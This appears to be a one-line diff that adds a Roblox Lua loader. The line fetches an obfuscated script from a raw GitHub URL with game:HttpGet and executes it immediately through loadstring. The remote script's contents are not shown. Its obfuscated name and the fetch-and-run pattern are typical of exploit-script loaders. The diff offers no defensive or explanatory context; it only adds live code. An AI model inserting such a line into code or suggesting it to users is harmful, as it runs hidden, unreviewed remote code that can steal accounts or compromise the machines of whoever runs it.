@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/MilkyWay00o/killmeroblox/main/obfuscated-8570.lua'))()
